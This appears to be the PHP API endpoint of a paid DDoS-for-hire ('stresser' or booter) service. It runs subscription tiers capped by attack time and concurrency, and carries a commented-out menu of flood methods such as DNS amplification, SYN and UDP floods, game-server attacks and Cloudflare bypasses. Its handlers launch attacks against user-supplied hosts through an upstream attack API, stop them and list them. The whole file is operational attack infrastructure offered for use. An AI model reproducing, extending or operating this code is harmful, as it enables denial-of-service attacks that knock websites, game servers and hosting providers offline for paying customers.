<?php

opcache_reset();

header('Content-Type: application/json');

$plans = [
    0 => [
        'concurrent' => 0, // free plan lol
        'time' => 0
    ],
    1 => [
        'concurrent' => 1,
        'time' => 300
    ],
    2 => [
        'concurrent' => 3,
        'time' => 600
    ],
    3 => [
        'concurrent' => 8,
        'time' => 1200
    ]
];

// $protocols = [
//     "DNS-AMP" => ['name' => "DNS"],
//     "MIX-AMP" => ['name' => "MIX"],
//     "TCP-SYN" => ['name' => "SYN"],
//     "TCP-SYN-ACK" => ['name' => "SYN ACK"],
//     "UDP-PPS" => ['name' => "UDP BOMB"],
//     "UDP-RAW" => ['name' => "UDP FLOOD"],
//     "HANDSHAKE" => ['name' => "HANDSHAKE"],
//     "MINECRAFT-MCPE" => [
//         'name' => "MINECRAFT",
//         'required-plan' => 2,
//     ],
//     "FIVEM-BYPASS" => [
//         'name' => "FIVEM",
//         'required-plan' => 2,
//     ],
//     "SAMP" => [
//         'name' => "GTA SA",
//         'required-plan' => 2,
//     ],
//     "VALVE-UDP" => [
//         'name' => "GARRY'S MOD",
//         'required-plan' => 2,
//     ],
//     "RUST-UDP" => [
//         'name' => "RUST",
//         'required-plan' => 2,
//     ],
//     "OVH-UDP" => [
//         'name' => "OVH UDP",
//         'required-plan' => 2,
//     ],
//     "OVH-HANDSHAKE" => [
//         'name' => "OVH HANDHAKE",
//         'required-plan' => 2,
//     ],
//     "OVH-GAMING" => [
//         'name' => "OVH GAME",
//         'required-plan' => 2,
//     ],
//     "HETZNER" => [
//         'name' => "HETZNER",
//         'required-plan' => 2,
//     ],
//     "TYNAHOST" => [
//         'required-plan' => 2,
//     ],
//     "HTTP-RAW" => ['name' => "HTTP FLOOD"],
//     "HTTPS-RAW" => ['name' => "HTTP FLOOD"],
//     "HTTPS-BROWSER" => ['name' => "HTTP BROWSER"],
//     "HTTP-MIX-BYPASS" => ['name' => "HTTP BYPASS"],
//     "CF-BYPASS" => [
//         'name' => "CLOUDFLARE BYPASS",
//         'required-plan' => 2,
//         'max-concurrent' => 2,
//         'max-time' => 200,
//         'cooldown' => 45
//     ],
//     "CF-UAM-BYPASS" => [
//         'name' => "CLOUDFLARE UAM",
//         'required-plan' => 3,
//         'max-concurrent' => 2,
//         'max-time' => 200,
//         'cooldown' => 45
//     ],
//     "CF-PRO-BYPASS" => [
//         'name' => "CLOUDFLARE PRO",
//         'required-plan' => 3,
//         'max-concurrent' => 2,
//         'max-time' => 200,
//         'cooldown' => 45
//     ],
//     "HTTPS-NUKE" => [
//         'required-plan' => 3,
//         'max-concurrent' => 1,
//         'max-time' => 120,
//         'cooldown' => 200
//     ],
//     "DNS-NUKE" => [
//         'required-plan' => 3,
//         'max-concurrent' => 1,
//         'max-time' => 120,
//         'cooldown' => 200
//     ],
// ];

require dirname(dirname(__DIR__)) . "/app/Models/includes.php";

// if($AUTHUSER['network_expire'] === null) {
//     $now = new DateTime();
//     $now->add(new DateInterval('P30D'));
//     $date = $now->format('Y-m-d H:i:s');
// } else {
//     $date_from_db = $AUTHUSER['network_expire'];
//     $datetime = new DateTime($date_from_db);
//     $datetime->add(new DateInterval('P30D'));
//     $date = $datetime->format('Y-m-d H:i:s');
// }

// echo $date;

if(!isset($_SESSION['user']['id'])) {
    http_response_code(401);
	die(json_encode(['success' => false, 'message' => "Missing api key to use the Network Hub"]));
}

if($AUTHUSER['network_plan'] === 0 || time() > strtotime($AUTHUSER['network_expire'])) {

	Logs::AddLogs(
		"User ".$AUTHUSER['username']." attempted to use Network Access API", 
		"danger", 
		"fas fa-baby-carriage"
	);

    http_response_code(401);
	die(json_encode(['success' => false, 'message' => "You do not have a network access subscription"]));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Get raw data
    $data = json_decode(file_get_contents("php://input"), true);

    
    // Extract form data
    $host = $data["host"];
    $port = $data["port"];
    $method = $data["method"];
    $time = $data["time"];
    
    $methodData = Attack::getMethod($method);

    $whitelists = Attack::retrieveWhitelist();

    foreach($whitelists as $whitelist) {
        if (preg_match("#".$whitelist['host']."#", $host)) {
            http_response_code(403);
            echo json_encode(['success' => false, 'message' => "launching an attack on this target is not possible"]);

            Logs::AddLogs(
                "User ".htmlentities($AUTHUSER['username'])." attempted to launch an attack on the host : {$host}:{$port} with method {$method} - {$time} seconds",
                "danger", 
                "fa fa-wifi"
            );

            exit;
        }
    }

    if (!isset($time) || $time <= 0 || $time == null) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => "the attack time is not specified"]);
        exit;
    }

    if (!isset($port) || $port <= 0 || $port == null) {
        if(!preg_match("#HTTP#", $method) && !preg_match("#CLOUDFLARE#", $method)) {
            http_response_code(403);
            echo json_encode(['success' => false, 'message' => "the target port is not specified"]);
            exit;
        }
        $port = 80;
    }

    if ($time > $plans[$AUTHUSER['network_plan']]['time']) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => "the specified attack time exceeds the limits of your plan"]);

        exit;
    }

    if (Attack::hasExceedsPlanConccurent($AUTHUSER['id'], $plans[$AUTHUSER['network_plan']]['concurrent'])) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => "You have exceeds the limits of concurrents of your plan"]);

        exit;
    }

    if (empty($methodData)) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => "{$method} is unknown attack method"]);
        exit;
    }

    if ($methodData['plan'] > $AUTHUSER['network_plan']) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => "A higher tier is necessary for the {$method} method!"]);
        exit;
    }

    // if (isset($methodData['max-time'])) {
    //     if ($time > $protocols[$method]['max-time']) {
    //         http_response_code(403);
    //         echo json_encode(['success' => false, 'message' => "the maximum attack time for the {$method} method is {$protocols[$method]['max-time']} seconds"]);
    //         exit;
    //     }
    // }

    $stresser = new Stresser($host, $port, $methodData['slug'], $time);
    $response = $stresser->start();

    // var_dump($response);

    //Host is not a valid IP

    if ($response == false) {
        echo json_encode(['success' => false, 'message' => "Failed to launch the attack. The Network Hub is Overloaded!"]);
        exit;
    }

    if (preg_match("#Your attack has been sent#", $response)) {
        Attack::recordAttack($host, $port, $method, $time, $AUTHUSER['id']);

        Logs::AddLogs(
            "User ".htmlentities($AUTHUSER['username'])." sent an attack on the host : {$host}:{$port} with method {$method} - {$time} seconds",
            "danger", 
            "fa fa-wifi"
        );

        echo json_encode(['success' => true, 'host' => $host, 'port' => $port, 'method' => $method, 'time' => $time]);
    } elseif(preg_match("#The method entered was not found#", $response)) {
        echo json_encode(['success' => false, 'message' => "Failed to launch the attack. The method entered was not found."]);
    } elseif(preg_match("#Your API is disabled#", $response)) {
        echo json_encode(['success' => false, 'message' => "Failed to launch the attack. The Network is currently offline."]);
    } elseif(preg_match("#Checking if the site connection is secure#", $response)) {
        echo json_encode(['success' => false, 'message' => "Failed to launch the attack. Network Hub is under maintenance!"]);
    } elseif (preg_match("#You have too many boots running.#", $response) || preg_match("#Connection timed out#", $response)) {
        echo json_encode(['success' => false, 'message' => "Failed to launch the attack. The Network Hub is Overloaded!"]);
    } else {
        echo json_encode(['success' => false, 'message' => "Failed to launch the attack. Please check your configuration and try again."]);
    }



} elseif ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
    // Get raw data
    $data = json_decode(file_get_contents("php://input"), true);

    $id = $data['id'];

    $attack = Attack::retrieveAttack($id);
    
    $stresser = new Stresser($attack['host'], $attack['port'], "STOP", $attack['time']);
    $response = $stresser->start();

    //var_dump($response);
    
    Attack::deleteAttack($id);
} else {
    $attacks = Attack::retrieveAttacksByUser($AUTHUSER['id']);
    $data = [];

    foreach($attacks as $attack) {
        if (strtotime($attack['created_at']) + $attack['time'] >= time()) {
            $data[] = [
                'id' => $attack['id'],
                'host' => $attack['host'],
                'port' => $attack['port'],
                'method' => $attack['method'],
                'time' => $attack['time'],
                'remaining' => ($attack['time'] + strtotime($attack['created_at']) - time())
            ];
        }
    }

    echo json_encode($data);
}